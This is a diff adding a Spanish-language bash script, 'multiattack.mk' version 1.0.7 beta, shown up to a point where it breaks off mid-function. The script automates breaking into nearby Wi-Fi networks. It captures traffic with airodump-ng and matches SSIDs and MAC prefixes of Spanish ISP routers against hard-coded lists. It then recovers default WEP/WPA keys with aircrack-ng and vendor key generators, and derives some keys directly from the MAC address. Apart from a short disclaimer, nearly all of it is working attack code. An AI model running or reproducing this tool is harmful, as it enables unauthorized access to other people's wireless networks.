@@ -1,0 +1,1406 @@
+#! /bin/bash
+
+
+#############################################################################################################
+# Programa:	multiattack.mk
+# Autor:	M.K. Maese Kamara para SeguridadWireless y elhacker
+# version: 1.0.7 beta
+# Fecha de esta version:        27-1-2012
+# Version requerida de aircrack-ng:  AIRCRACK-NG 1.0
+# Dependencias: aircrack-ng, grep, awk, xterm, Wlandecrypter, jazzteldecrypter, stkeys, 
+#               Dlinkdecrypter, wlan4xx, ono4xx, WPAmagickey.
+#
+#
+#
+#
+#          Se han utilizado partes del codigo AIROSCRIPT mejorado Por Chinitiw y
+#	   elmanuvolador 
+#          para Seguridad Wireless
+#	
+#  Nota: Este script ha sido creado para desmostrar lo facil que resulta el acceso a una red 
+#	 inalambrica cuya clave por defecto no haya sido cambiada.
+#
+#        No me hago responsable del uso que se pueda hacer de este script.
+#
+#        Para mayor seguridad de tu red WIFI pon cifrado WPA y una clave robusta
+#
+# Agradecimientos: a USUARIONUEVO por sus ideas para la mejora de este Script
+#                  a naymenos por los reportes de bugs, aportes y la creación del manual de uso.
+#                  a alist3r por dejarme usar HexString2ASCII
+#
+#############################################################################################################
+
+# Establecer directorios de trabajo y valores iniciales
+DUMP_key="/bugtraq/wifi/keys"
+DUMP_PATH="/bugtraq/wifi/capture"
+DUMP_channel=""
+FUDGEFACTOR="2"
+WORDLIST="/bugtraq/wifi/wordlist"
+WORDLIST1="/bugtraq/wifi/wordlist"
+WIFI=""
+TEMP="/tmp/multiattack_tmp"
+version="Ver.1.0.7 beta"
+# crear direcotrio para guardar keys si no existe
+for ruta in $DUMP_key $DUMP_PATH ; do
+  if [[ ! -d "$ruta" ]]; then rm -f "$ruta"; fi # si la ruta no es un directorio, se borra
+  if [[ ! -e "$ruta" ]]; then mkdir "$ruta"; fi
+  # si no existe la ruta (bien porque no existia ya antes o porque no era una carpeta y acabamos de borrarlo),
+  # entonces creamos la carpeta
+done
+mkdir $TEMP
+
+
+
+
+############################################################################################
+####################################################################
+#######################################
+# StringFunctions.sh - v0.1 - por alist3r
+# con la inestimable ayuda de toda la crew de SW
+# En este script iremos añadiendo funciones comunes
+# para el manejo de cadenas ascci y hexa en nuestros scripts
+
+# Vars Globales
+HexString2ASCIIResult=
+HexPair2ASCIIResult=
+
+
+function HexString2ASCII {
+# Debe recibir una cadena de texto hexa valida
+# Devuelve el valor convertido mediante $HexStringToASCIIResult
+
+HexString2ASCIIResult=
+HexStringToASCIINotFullyPrintable=false
+# lo primero es vaciar las variables de resultados
+# por si acaso ya habiamos llamado a la funcion antes y tienen algo
+
+stringtoprocess="`echo $1|tr -d ':'`" 
+# quitamos los ":"
+
+stringtoprocess="`echo $stringtoprocess|tr '[:lower:]' '[:upper:]'`" 
+
+# la pasamos a uppercase porque si no BC no se entera de nada.
+
+longitud=${#stringtoprocess} # averiguamos la longitud de la cadena
+
+# es posible que necesitemos rellenar con un cero por delante si la longitud de la cadena es impar.
+# si no, al tomar las parejas de bytes, empezaremos mal y acabaremos peor.
+let "isnoon = $longitud % 2" # calcular el modulo de dos de la longitud de la cadena
+
+if [ $isnoon -eq 1 ] ; then # el modulo de dos de un numero devuelve 1 si este es impar
+let longitud=$longitud+1 # actualizamos la longitud de la cadena
+stringtoprocess="0"$stringtoprocess # concatenamos un cero por delante
+## echo "DEBUG:: Noon detected. Appending 0 to make pair"
+fi
+
+for ((puntero=1;puntero<=$longitud;puntero+=2)); do
+# vamos a ir tomando parejitas de bytes de la cadena 
+# hasta procesarla por completo
+currentpairofbytes=$( echo "` expr substr "$stringtoprocess" $puntero 2`" )
+# Ahora tenemos una cadena con dos bytes hexa en $currentpairofbytes
+
+foo=$( echo "obase=10; ibase=16; $currentpairofbytes" | bc )
+# pasamos la cantidad hexadecimal a base decimal con BC
+## echo "DEBUG:: foo value: " $foo
+if [[ "$foo" -lt 32 || "$foo" -gt 126 ]] ; then
+
+# si no es del 32 al 126, el codigo ASCII de este par no es imprimible
+# si hay aunque sea un solo caracter no imprimible, activamos la flag
+# $HexStringToASCIINotFullyPrintable
+HexStringToASCIINotFullyPrintable=true
+foo="."
+# claro, algo tendremos que poner, pero el caracter
+# en cuestion no es imprimible. lo tipico es el punto.
+## echo "DEBUG:: Non printable char detected. Assuming \".\""
+else
+foo=$( printf "\x$(printf %x $foo)" )
+# pasamos la cifra decimal a su equivalente ascii
+
+fi
+## echo "DEBUG:: " $stringtoprocess
+HexString2ASCIIResult="$HexString2ASCIIResult"$foo # concatenamos el ASCII obtenido
+done
+
+}
+
+################################################################################
+############################################################3
+###############################################
+
+
+
+#poner tarjeta en modo monitor
+#poner o seleccionar tarjeta en modo monitor
+function monitor_mode {
+clear 
+echo ""
+echo "                     Ponga la interface en modo monitor "
+echo "                   y/o cierre las ventanas para comenzar: "
+sleep 2
+kmdr-executor  /usr/share/wifislax/airmon-ng.kmdr
+clear
+INTERFACES=`ip link|egrep "^[0-9]+"|cut -d ':' -f 2 |awk {'print $1'} |grep -v lo`
+if [ $WIFI = "" ]
+clear
+then
+echo "=> Seleccione Una interface: "
+echo ""
+select WIFI in $INTERFACES; do
+break;
+done
+echo ""
+echo "Interface seleccionado: $WIFI"
+else
+clear 
+fi
+sleep 2
+menu
+}
+
+
+
+function auto_select_monitor {
+#! /bin/bash
+
+
+#############################################################################################################
+# Programa:	monitormode
+# Autor:	M.K. Maese Kamara 
+#
+# Detectar tarjetas y montar  en modo monitor 
+
+#############################################################################################################
+
+
+#poner tarjeta en modo monitor AUTOMATICO
+
+clear
+t=0
+if [ "$WIFI" = "" ]; then
+> $TEMP/wireless.txt
+cards=`airmon-ng|cut -d ' ' -f 1 | awk {'print $1'} |grep -v Interface #|grep -v  mon   `
+echo $cards >> $TEMP/wireless.txt
+tarj1=`cat $TEMP/wireless.txt | cut -d  ' ' -f 1  | awk  '{print $1}'`
+tarj2=`cat $TEMP/wireless.txt | cut -d  ' ' -f 2  | awk  '{print $1}'`
+rm  -rf $TEMP/wireless.txt
+
+if  [ "$tarj1" = "" ]; then
+clear
+echo "                  * * *     A T E N C I O N     * * *                "
+	echo ""
+	echo "    No se ha encontrado ninguna tarjeta Wireless en este equipo"
+	echo ""
+	echo "    Pulsa ENTER para volver al menu"
+read yn
+menu
+fi
+
+if [ "$tarj1" = "$tarj2" ]; then
+tarj2=""
+fi
+
+tarjselec=$tarj1
+
+if [ "$tarj2" != "" ] ;then
+echo
+echo
+echo "      Se han encontrado las siguientes tarjetas wifi en este equipo"
+echo
+
+airmon-ng |awk 'BEGIN { print "Tarjeta  Chip              Driver\n------- ------------------ ----------" } \
+  { printf "%-8s %-8s %-1s %10s\n", $1, $2, $3, $4 | "sort -r"}' |grep -v Interface  |grep -v Chipset
+
+echo "      selecciona una para utilizarla en modo monitor"
+echo
+
+tarj_wire=""
+tarjselec=""
+function selectarj {
+select tarjselec in `airmon-ng | awk {'print $1 | "sort -r"'} |grep -v Interface |grep -v Chipset  `; do
+break;
+done
+
+if [ "$tarjselec" = "" ]; then
+echo "  La opcion seleccionada no es valida"
+echo "  Introduce una opcion valida..."
+selectarj
+fi
+}
+
+if [ "$tarjselec" = "" ]; then
+selectarj
+fi
+
+echo ""
+echo "Interface seleccionado: $tarjselec"
+
+fi
+else
+echo 
+fi
+tarjmonitor=${tarjselec:0:3}
+if [ "$tarjmonitor" != "mon" ] && [ "$WIFI" = "" ];then
+echo ""
+echo ""
+echo "                    Se está montando la tarjeta en modo monitor"
+echo "" 
+sleep 1
+airmon-ng start $tarjselec >/dev/null
+cards=`airmon-ng|cut -d ' ' -f 1 |awk {'print $1'} |grep -v Interface`
+largo=${#cards}
+final=$(($largo-5))
+WIFI=${cards:final}
+echo  " $WIFI ----> Se utlilizara en modo monitor."
+sleep 2
+
+else 
+if [ "$WIFI" = "" ];then
+WIFI="$tarjselec"
+
+echo "" 
+echo  " $WIFI ----> Se utlilizara en modo monitor."
+sleep 2
+fi
+fi
+
+
+
+if [ $auto = "on" ]; then
+automode
+fi
+if [ $only = "on" ]; then
+onlyscan 
+fi
+if [ $choose = "on" ]; then
+choosescan
+fi
+
+menu
+}
+
+
+#  Salir y desmontar tarjeta
+function DESMONTAR_tarj_y_salir {
+if [ "$WIFI" != "" ]; then
+clear
+echo ""
+  echo ""
+  echo "  	M U L T I A T T A C K   P A R A   P A T R O N E S   C O N O C I D O S"
+  echo ""
+  echo ""
+  echo "	####################################################################"
+  echo "	###                                                              ###"
+  echo "	###     ¿ quiere desnontar la tarjeta antes de salir?            ###"
+  echo "	###                                                              ###"
+  echo "	###        (n) no   -> Salir sin desmontar                       ###"
+  echo "	###        (m) Menú -> Volver al menú principal                  ###"
+  echo "	###        ENTER    -> Desmontar y Salir                         ###"
+  echo "	###                                                              ###"
+  echo "	###                                                              ###"
+  echo "	####################################################################"
+  echo ""
+  echo ""
+read salida
+set -- ${salida}
+
+if [ "$salida" = "m" ]; then
+menu
+fi
+if [ "$salida" = "n" ]; then
+  echo ""
+echo "         Hasta Pronto..."
+sleep 2
+clear 
+exit
+fi
+echo "$WIFI Ha sido desmontada"
+airmon-ng stop $WIFI >/dev/null
+fi
+  echo ""
+echo "         Hasta Pronto..."
+sleep 2
+clear
+ exit
+
+}
+
+# Escaneo de redes antes de lanzar captura
+function onlyscan {
+
+clear
+echo ""
+echo "                    Se va a iniciar el Escaneo de redes "
+echo ""
+echo "                    Espere hasta ver todas las redes posibles"
+echo "                    para seleccionar la captura optima."
+echo "                    Cierre la shell de ESCANEO para continuar"
+sleep 2
+#  konsole -T "Scaneo de Objetivos ..." --nomenubar --schema LightPicture.schema -e airodump-ng -a $WIFI
+xterm $HOLD -title "Escaneando Objetivos ..." $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -a $WIFI
+only=""
+menu
+}
+
+# comprobar si tarjeta está en monitor e iniciar CAPTURAS
+function choosescan {
+
+clear
+chan=""
+clear
+  echo ""
+  echo ""
+  echo "  	M U L T I A T T A C K   P A R A   P A T R O N E S   C O N O C I D O S"
+  echo ""
+  echo "	####################################################################"
+  echo "	###                  Multiattack "$version"                  ###"
+  echo "	###                                                              ###"
+  echo "	###                                                              ###"
+  echo "	###                                                              ###"
+  echo "	###   1) Modo   ***********************************************  ###"
+  echo "	###   2) Inici  **                                           **  ###"
+  echo "	###   3) Inici  **                                           **  ###"
+  echo "	###   4) Obten  **    Seleccione Canal de Capturas           **  ###"
+  echo "	###   5) Obten  **                                           **  ###"
+  echo "	###   6) Ejecu  **     Un solo canal     6                   **  ###"
+  echo "	###   7) Ejecu  **     rango de canales  1-5                 **  ###"
+  echo "	###   8) Manua  **     Multiples canales 1,2,5-7,11          **  ###"
+  echo "	###             **                                           **  ###"
+  echo "	###   0) Salir  **     Enter: todos los canales              **  ###"
+  echo "	###             **                                           **  ###"
+  echo "        ###             ***********************************************  ###"
+  echo "	###                                                              ###"
+  echo "	###                                                              ###"
+  echo "	###                                                              ###"
+  echo "	###                                                              ###"
+  echo "	###                                                              ###"
+  echo "	####################################################################"
+  read DUMP_channel
+set -- ${DUMP_channel}
+
+clear
+   if [ "$DUMP_channel" = "$chan" ]; then
+   canal="... Todos los canales..."
+   else
+   canal="El[os] Canal[es] ... $DUMP_channel ..."
+   fi
+echo ""
+echo "                    Se va a iniciar la captura en $canal"
+echo ""
+echo "           Cuando tenga suficientes Datas (4 minimo para encriptacion WEP)" 
+echo "                    cierra la shell de CAPTURAS para continuar...   "
+sleep 2
+if [ -e $DUMP_PATH/dump-01.cap ]; then
+rm  $DUMP_PATH/dump*
+fi
+
+   if [ "$DUMP_channel" = "$chan" ]; then
+xterm $HOLD -title "Capturando Objetivos en $canal..." $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng  -w $DUMP_PATH/dump -a $WIFI & sleep 1
+   else
+xterm $HOLD -title "Capturando Objetivos en $canal..." $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng --channel "$DUMP_channel" -w $DUMP_PATH/dump -a $WIFI & sleep 1
+fi
+choose=""
+menu
+}
+#ejecutar AIRCRACK-NG para obtener clave
+function crackauto1  {
+   xterm -iconic -e aircrack-ng  -l $DUMP_key/$Host_SSID -K -w $WORDLIST -b $Host_MAC -f $FUDGEFACTOR -0 -s  $DUMP_PATH/*.cap 
+}
+function crackauto2   {
+   xterm -iconic -e aircrack-ng -l $DUMP_key/$Host_SSID -K -w $WORDLIST1 -b $Host_MAC -f $FUDGEFACTOR -0 -s  $DUMP_PATH/*.cap
+}
+# lanzar wlandecrypter
+function wlandecrypter_auto {
+#	cd /root/swireless/wordlist
+#	kmdr-executor /usr/share/wifislax/wlandecrypter.kmdr
+        rm -rf $TEMP/*
+   xterm -iconic -e wlandecrypter  $Host_MAC $Host_SSID $WORDLIST
+	crackauto1
+	}
+# lanzar jazzteldecrypter
+function jazzteldecrypter_auto {
+        rm -rf $TEMP/*
+   xterm -iconic -e jazzteldecrypter  $Host_MAC $Host_SSID $WORDLIST
+	crackauto1
+	}
+# lanzar stkeys WPA
+function stkeys_auto_WPA {
+        rm -rf $TEMP/*
+	pianista=`echo $Host_SSID | cut -d $hasta -f 2`
+	xterm -iconic -e stkeys -i $pianista -v -o $DUMP_key/$Host_SSID
+	
+	}
+function stkeys_auto_WEP {
+	rm -rf $TEMP/*
+	pianista=`echo $Host_SSID | cut -d $hasta -f 2`
+	xterm -iconic -e stkeys -i $pianista -v -o $WORDLIST
+	crackauto1
+	}
+# lanzar dlinkdecrypter
+function dlinkdecrypter_auto {
+        rm -rf $TEMP/*
+   xterm -iconic -e dlinkdecrypter  $Host_MAC
+	crackauto2
+	}
+# lanzar wlan4xx
+function wlan4xx_auto {
+#	cd /root/swireless/wordlist
+#	kmdr-executor /usr/share/wifislax/wlan4xx.kmdr
+        rm -rf $TEMP/*
+   xterm -iconic -e wlan4xx  $Host_SSID $Host_MAC $WORDLIST
+	crackauto1
+	}
+# lanzar ono4xx
+function ono4xxwep_auto {
+#	cd /root/swireless/wordlist
+#	kmdr-executor /usr/share/wifislax/ono4xx.kmdr
+        rm -rf $TEMP/*
+   xterm -iconic -e ono4xx  $Host_SSID $Host_MAC wep $WORDLIST
+	crackauto1
+	}
+function ono4xxwpa_auto {
+#	cd /root/swireless/wordlist
+#	kmdr-executor /usr/share/wifislax/ono4xx.kmdr
+        rm -rf $TEMP/*
+   xterm -iconic -e ono4xx  $Host_SSID $Host_MAC wpa $WORDLIST
+	crackauto1
+	}
+
+function WPAmagickey {
+   rm -rf $TEMP/*
+   xterm -iconic -e WPAmagickey $Host_SSID  $Host_MAC $WORDLIST
+
+magickey=`head -8 $WORDLIST|tail -1`
+
+
+}
+
+
+# leer la key obtenida por Aircrack-ng
+function leerkey  {
+
+if [ -e $DUMP_key/$Host_SSID ] ; then
+cat $DUMP_key/$Host_SSID > /dev/null ; a=$?
+while read clave1 ; do
+echo ;
+	if [ "$WPA" = "1" ]; then 
+	clave[$r]="${clave1} < Posible Key >" 
+	fi
+done < $DUMP_key/$Host_SSID
+	if [ "$WPA" != "1" ]; then 
+	clave[$r]=${clave1} 
+	fi
+
+rm  -rf $DUMP_key/$Host_SSID
+else
+clave[$r]=".NO SE ENCONTRO LA CLAVE.."
+break 
+
+fi
+}
+
+function autocrack  {
+
+# comprobando si hay capturas, en caso contrario ejecuta el ataque.
+	if [ -e $DUMP_PATH/dump-01.csv ] ; then
+
+
+#rm $DUMP_key/multiattack.txt
+# leer datos de captura
+
+
+ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
+head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump_02.txt
+clear
+#sleep 1
+echo "                         Listado de AP'S Objetivo"
+echo ""
+echo "        MAC                      ENC    DATAS   SSID"
+echo ""
+i=1
+r=0
+while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
+ longueur=${#MAC}
+   if [ $longueur -ge 17 ]; then
+    i=$(($i+1))
+
+#echo -e "\t"$Host_MAC"\t"$Host_ENC"\t"$Host_IV"\t"$Host_SSID
+
+
+
+
+# Asignar valores de capturas a variables
+aidlenght=$IDLENGTH
+assid[$i]=$ESSID
+amac[$i]=$MAC
+aprivacy[$i]=$PRIVACY
+aiv[$i]=$IV
+idlenght=${aidlenght[$i]}
+ssid=${assid[$i]}
+mac=${amac[$i]}
+privacy=${aprivacy[$i]}
+datas=${aiv[$i]}
+Host_ENC=$privacy
+Host_MAC=$mac
+Host_IV=$datas
+acouper=${#ssid}
+fin=$(($acouper-idlength))
+Host_SSID=${ssid:1:fin}
+#
+# Comprobar que SSID y ENC no esten vacios
+# para que no de error en las comparaciones
+#
+nadaSSID=${#Host_SSID}
+if [ $nadaSSID = 0 ];then
+Host_SSID="?????"
+fi
+if [ "$Host_ENC" = "     " ];then
+Host_ENC="?????"
+fi
+
+echo -e "\t"$Host_MAC"\t"$Host_ENC"\t"$Host_IV"\t"$Host_SSID
+
+nombretelefonica[$i]=${Host_SSID:0:5}
+nombredlink[$i]=${Host_SSID:0:5}
+nombretouch[$i]=${Host_SSID:0:10}
+nombrethoms[$i]=${Host_SSID:0:7}
+nombrejazztel[$i]=${Host_SSID:0:8}
+nombreono[$i]=${Host_SSID:0:3}
+nombreyacom[$i]=${Host_SSID:0:5}
+nombrewlan[$i]=${Host_SSID:0:4}
+nombrewifi[$i]=${Host_SSID:0:4}
+nombreptv[$i]=${Host_SSID:0:3}
+
+H_SSID[$i]=$Host_SSID
+H_MAC[$i]=$Host_MAC
+H_DATA[$i]=$Host_IV
+H_ENC[$i]=$Host_ENC
+long_SSID[$i]=${#Host_SSID}
+
+
+r=$i
+
+
+
+  fi
+done < $DUMP_PATH/dump_02.txt
+
+
+# comprobando si hay capturas, en caso contrario ejecuta el ataque.
+	if [ "$r" = "1" ] ; then
+	echo "                  * * *     A T E N C I O N     * * *                "
+	echo ""
+	echo "                  No se ha encontrado ninguna captura"
+	echo "                  antes debes capturar objetivos"
+	echo ""
+	else
+
+
+###
+###Comprobando SSID's, creando diccionarios y ejecutando aircrack
+###
+
+echo ""
+echo ""
+echo "--   Procesando Datos... Espere..."
+echo ""
+clave=""
+PINWPS=""
+redabierta=""
+redopn="OPN"
+  enc="WEP"
+telef="WLAN_"
+dlink="Dlink"
+touch="SpeedTouch"
+thoms="Thomson"
+ jazz="JAZZTEL_"
+  ono="ONO"
+ wlan="WLAN"
+yacom="YACOM"
+ wifi="WiFi"
+  PTV="PTV"
+p=$r
+
+while [ 2 -le $r ]; do
+clave[$r]=""
+WPA=""
+#  asignando MAC conocidas de WLAN_XX
+
+inimac[1]="40:4A:03"
+inimac[2]="00:A0:C5"
+inimac[3]="00:60:B3"
+inimac[4]="00:30:DA"
+inimac[5]="00:23:F8"
+inimac[6]="00:1F:9F"
+inimac[7]="00:1D:20"
+inimac[8]="00:1A:2B"
+inimac[9]="00:19:CB"
+inimac[10]="00:19:15"
+inimac[11]="00:16:38"
+inimac[12]="00:13:49"
+inimac[13]="00:03:DA"
+inimac[14]="00:03:C9"
+inimac[15]="00:02:CF"
+inimac[16]="00:01:38"
+inimac[17]="00:01:36"
+inimac[18]="E0:91:53"
+inimac[19]="50:67:F0"
+
+realmac=${H_MAC[$r]}
+inimac_WLAN=${realmac:0:8}
+#  comprobando WLAN_XX
+la="7"
+i=19 # numero de MAC WLAN_xx conocidas
+while [ 1 -le $i ]; do
+
+if [ "$ESSID_cambiado" = "off" ]; then
+if [ "${nombretelefonica[$r]}" = "$telef" ] && [ "${long_SSID[$r]}" = "$la" ] && [ ${H_DATA[$r]} -ge 4 ] && [ ${H_ENC[$r]} = $enc ] && [  "${inimac[$i]}" = "$inimac_WLAN" ]; then
+echo "--   Obteniendo KEY de: ${H_SSID[$r]} Espere . . ."
+Host_SSID=${H_SSID[$r]}
+Host_MAC=${H_MAC[$r]}
+wlandecrypter_auto
+leerkey
+fi
+fi
+#  comprobando posible WLAN_XX con nombre ESSID cambiado
+if [ "$ESSID_cambiado" = "on" ]; then
+
+
+if [ "${nombretelefonica[$r]}" != "$telef" ]  && [ "${nombretelefonica[$r]}" != "?????" ] && [ ${H_DATA[$r]} -ge 4 ] && [ ${H_ENC[$r]} = $enc ] && [  ${inimac[$i]} = $inimac_WLAN ]; then
+	echo "--   Obteniendo KEY de: ${H_SSID[$r]}  => *** Posible red WLAN_XX ***  ten paciencia... Tardara unos minutos."
+	Host_SSID="WLAN_??"
+	Host_MAC=${H_MAC[$r]}
+	wlandecrypter_auto
+	leerkey
+fi
+fi
+i=$(($i-1))
+done
+
+
+
+#  comprobando Dlink
+la="5"
+if [ "${nombredlink[$r]}" = "$dlink" ] && [ ${long_SSID[$r]} = $la ] && [ ${H_DATA[$r]} -ge 4 ] && [ ${H_ENC[$r]} = $enc ]; then
+echo "--   Obteniendo KEY de: ${H_SSID[$r]} Espere . . ."
+Host_SSID=${H_SSID[$r]}
+Host_MAC=${H_MAC[$r]}
+dlinkdecrypter_auto
+leerkey
+fi
+
+#  comprobando SpeedTouch Thomson WPA
+la="16"
+if [ "${nombretouch[$r]}" = "$touch" ] && [ ${long_SSID[$r]} = $la ] && [ ${H_ENC[$r]} != $enc ]; then
+echo "--   Obteniendo KEY de: ${H_SSID[$r]} Espere . . ."
+Host_SSID=${H_SSID[$r]}
+Host_MAC=${H_MAC[$r]}
+hasta="h"
+stkeys_auto_WPA
+WPA="1"
+leerkey
+fi
+la="13"
+if [ "${nombrethoms[$r]}" = "$thoms" ] && [ ${long_SSID[$r]} = $la ] && [ ${H_ENC[$r]} != $enc ]; then
+echo "--   Obteniendo KEY de: ${H_SSID[$r]} Espere . . ."
+Host_SSID=${H_SSID[$r]}
+Host_MAC=${H_MAC[$r]}
+hasta="n"
+stkeys_auto_WPA
+WPA="1"
+leerkey
+fi
+
+#  comprobando SpeedTouch Thomson WEP
+la="16"
+if [ "${nombretouch[$r]}" = "$touch" ] && [ ${long_SSID[$r]} = $la ] && [ ${H_ENC[$r]} = $enc ]; then
+echo "--   Obteniendo KEY de: ${H_SSID[$r]} Espere . . ."
+Host_SSID=${H_SSID[$r]}
+Host_MAC=${H_MAC[$r]}
+hasta="h"
+stkeys_auto_WEP
+leerkey
+fi
+la="13"
+if [ "${nombrethoms[$r]}" = "$thoms" ] && [ ${long_SSID[$r]} = $la ] && [ ${H_ENC[$r]} = $enc ]; then
+echo "--   Obteniendo KEY de: ${H_SSID[$r]} Espere . . ."
+Host_SSID=${H_SSID[$r]}
+Host_MAC=${H_MAC[$r]}
+hasta="n"
+stkeys_auto_WEP
+leerkey
+fi
+
+#  asignando MAC conocidas de JAZZTEL_XX
+inicmac[1]="00:1A:2B"
+realmac=${H_MAC[$r]}
+inimacJAZZ=${realmac:0:8}
+i=1 # numero de MAC JAZZTEL_XX conocidas 
+
+#  comprobando JAZZTEL_XX
+la="10"
+while [ 1 -le $i ]; do
+
+if [ "$ESSID_cambiado" = "off" ]; then
+if [ "${nombrejazztel[$r]}" = "$jazz" ] && [ ${long_SSID[$r]} = $la ] && [ ${H_DATA[$r]} -ge 4 ] && [ ${H_ENC[$r]} = $enc ]; then
+echo "--   Obteniendo KEY de: ${H_SSID[$r]} Espere . . ."
+Host_SSID=${H_SSID[$r]}
+Host_MAC=${H_MAC[$r]}
+jazzteldecrypter_auto
+leerkey
+fi
+fi
+
+#  comprobando posible JAZZTEL_XX con nombre ESSID cambiado
+if [ "$ESSID_cambiado" = "on" ]; then
+if [ "${nombrejazztel[$r]}" != "$jazz" ] && [ "${nombrejazztel[$r]}" != "?????" ] && [ ${inimac[$i]} = $inimacJAZZ ] && [ ${H_DATA[$r]} -ge 4 ] && [ ${H_ENC[$r]} = $enc ] && [ "$ESSID_cambiado" = "on" ]; then
+echo "--   Obteniendo KEY de: ${H_SSID[$r]}  => *** Posible red JAZZTEL ***  ten paciencia... Tardara unos minutos."
+Host_SSID="JAZZTEL_??"
+Host_MAC=${H_MAC[$r]}
+jazzteldecrypter_auto
+leerkey
+fi
+fi
+i=$(($i-1))
+done
+
+#  comprobando ONO WEP
+#  asignando MAC conocidas de ONOXXXX
+la="7"
+inimac[1]="00:01:38"
+inimac[2]="E0:91:53"
+realmac=${H_MAC[$r]}
+inimacONO=${realmac:0:8}
+i=2 # numero de MAC ONOXXXX conocidas
+while [ 1 -le $i ]; do
+if [ "${nombreono[$r]}" = "$ono" ] && [ ${long_SSID[$r]} = $la ] && [ $inimacONO = ${inimac[$i]} ] && [ ${H_DATA[$r]} -ge 4 ] && [ ${H_ENC[$r]} = $enc ]; then
+echo "--   Obteniendo KEY de: ${H_SSID[$r]} Espere . . ."
+Host_SSID=${H_SSID[$r]}
+Host_MAC=${H_MAC[$r]}
+ono4xxwep_auto
+leerkey
+fi
+i=$(($i-1))
+done
+
+#  comprobando WLANXXXXXX
+la="10"
+if [ "${nombrewlan[$r]}" = "$wlan" ] && [ ${long_SSID[$r]} = $la ] && [ ${H_DATA[$r]} -ge 4 ] && [ ${H_ENC[$r]} = $enc ]; then
+echo "--   Obteniendo KEY de: ${H_SSID[$r]} Espere . . ."
+Host_SSID=${H_SSID[$r]}
+Host_MAC=${H_MAC[$r]}
+wlan4xx_auto
+leerkey
+fi
+
+#  comprobando YACOMxxxxxx
+la="11"
+if [ "${nombreyacom[$r]}" = "$yacom" ] && [ ${long_SSID[$r]} = $la ] && [ ${H_DATA[$r]} -ge 4 ] && [ ${H_ENC[$r]} = $enc ]; then
+echo "--   Obteniendo KEY de: ${H_SSID[$r]} Espere . . ."
+Host_SSID=${H_SSID[$r]}
+Host_MAC=${H_MAC[$r]}
+wlan4xx_auto
+leerkey
+fi
+
+#  comprobando WiFixxxxxx
+la="10"
+if [ "${nombrewifi[$r]}" = "$wifi" ] && [ ${long_SSID[$r]} = $la ] && [ ${H_DATA[$r]} -ge 4 ] && [ ${H_ENC[$r]} = $enc ]; then
+echo "--   Obteniendo KEY de: ${H_SSID[$r]} Espere . . ."
+Host_SSID=${H_SSID[$r]}
+Host_MAC=${H_MAC[$r]}
+wlan4xx_auto
+leerkey
+fi
+
+#  comprobando WLAN_XXXX y JAZZTEL_XXXX
+
+#asignar MACs conocidas Para WLAN_XXXX
+inimac[1]="00:1A:2B"
+inimac[2]="00:1D:20"
+inimac[3]="38:72:C0"
+inimac[4]="64:68:0C"
+inimac[5]="00:1F:A4"
+inimac[6]="F4:3E:61"
+
+la="9"
+magickey=""
+realmac=${H_MAC[$r]}
+inimacWLANmagic=${realmac:0:8}
+i=6  # numero de MACs conocidas de WLAN_XXXX y JAZZTEL_XXXX 
+
+# asignar PIN WPS A ROUTER TELECOM 00:19:15 WLAN_XXXX
+if [ "${nombretelefonica[$r]}" = "$telef" ] && [ ${long_SSID[$r]} = $la ] && [ "$inimacWLANmagic" = "00:19:15" ];then
+echo "--   Obteniendo PIN-WPS de: ${H_SSID[$r]} Espere . . ."
+PINWPS[$r]="12345670....."
+clave[$r]=".........................."
+fi
+
+while [ 1 -le $i ]; do
+
+if [ "${nombretelefonica[$r]}" = "$telef" ] && [ "${long_SSID[$r]}" = "$la" ] && [ "$inimacWLANmagic" = "${inimac[$i]}" ]; then
+echo "--   Obteniendo KEY de: ${H_SSID[$r]} Espere . . ."
+Host_SSID=${H_SSID[$r]}
+Host_MAC=${H_MAC[$r]}
+WPAmagickey
+clave[$r]=$magickey
+PINWPS[$r]="............."
+#WPA="1"
+#leerkey
+if [ ${H_ENC[$r]} = $enc ]; then
+ESSID=`echo $Host_SSID | awk -F "_" '{print $2}'`
+MACESS=`echo $Host_MAC | awk -F ":" '{print $1 $2 $3 $4}'`$ESSID
+clave[$r]=C$MACESS"             "
+fi
+
+fi
+i=$(($i-1))
+done
+
+#  comprobando JAZZTEL_XXXX WPA 
+#asignar MACs conocidas Para WLAN_XXXX
+inimac[1]="00:1A:2B"
+inimac[2]="00:1D:20"
+inimac[3]="38:72:C0"
+inimac[4]="64:68:0C"
+inimac[5]="00:1F:A4"
+inimac[6]="F4:3E:61"
+
+la="12"
+magickey=""
+realmac=${H_MAC[$r]}
+inimacWLANmagic=${realmac:0:8}
+i=6  # numero de MACs conocidas de WLAN_XXXX y JAZZTEL_XXXX 
+
+while [ 1 -le $i ]; do
+
+if [ "${nombrejazztel[$r]}" = "$jazz" ] && [ ${long_SSID[$r]} = $la ] && [  ${inimac[$i]} = $inimacWLANmagic ] ; then
+echo "--   Obteniendo KEY de: ${H_SSID[$r]} Espere . . ."
+Host_SSID=${H_SSID[$r]}
+Host_MAC=${H_MAC[$r]}
+WPAmagickey
+clave[$r]=$magickey
+PINWPS[$r]="............."
+#WPA="1"
+#leerkey
+if [ ${H_ENC[$r]} = $enc ]; then
+ESSID=`echo $Host_SSID | awk -F "_" '{print $2}'`
+MACESS=`echo $Host_MAC | awk -F ":" '{print $1 $2 $3 $4}'`$ESSID
+clave[$r]=C$MACESS"             "
+fi
+fi
+i=$(($i-1))
+done
+
+
+
+#  comprobando PTV_xxxx WEP
+if [ "${nombreptv[$r]}" = "$PTV" ]  && [ ${H_ENC[$r]} = $enc ]; then
+echo "--   Obteniendo KEY de: ${H_SSID[$r]} Espere . . ."
+# quitamos los ":" de la MAC
+Host_MAC=${H_MAC[$r]}
+MACsinpuntos="`echo $Host_MAC|tr -d ':'`"
+clave[$r]=${MACsinpuntos:2:10}
+
+fi
+
+# Comprobar si la red está abierta
+#
+# Comprobar que  H_ENC no este vacio
+# para que no de error en las comparaciones
+#
+
+if [ "${H_ENC[$r]}" != "     " ];then
+
+if [ ${H_ENC[$r]} = $redopn ]; then
+Host_SSID=${H_SSID[$r]}
+Host_MAC=${H_MAC[$r]}
+#clave[$r]="...LA RED ESTA ABIERTA...."
